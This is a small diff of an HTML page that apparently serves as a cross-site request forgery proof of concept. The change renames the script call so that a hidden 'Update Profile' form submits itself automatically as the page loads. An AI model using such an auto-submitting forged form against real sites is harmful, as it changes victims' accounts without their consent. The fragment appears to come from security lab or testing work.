@@ -30,7 +30,8 @@
     <input type="hidden" name="submit" value="Update Profile">
 </form>
 <script>
-    document.XSRF.submit();
+    document.xsrf_attack1.submit();
+    
 
 </script>
 </body>
